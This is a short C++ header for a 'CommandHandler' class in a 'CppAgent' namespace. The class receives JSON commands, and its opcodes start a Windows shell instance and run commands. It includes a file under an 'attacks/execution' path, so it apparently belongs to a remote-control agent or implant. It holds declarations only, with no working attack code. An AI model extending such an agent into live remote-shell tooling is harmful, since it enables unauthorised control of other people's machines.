#pragma once
#include <string>
#include <memory>
#ifdef _WIN32
#include "attacks/execution/shell_service/Shell.hpp"
#endif

namespace CppAgent {
    class CommandHandler {
    public:
        CommandHandler();
        std::string handle(const std::string& commandJson);
    private:
        bool shell_running_;
#ifdef _WIN32
        std::unique_ptr<win32::Shell> shell_;
#endif
        static constexpr int START_SHELL_INSTANCE = 1;
        static constexpr int RUN_COMMAND = 2;
    };
}
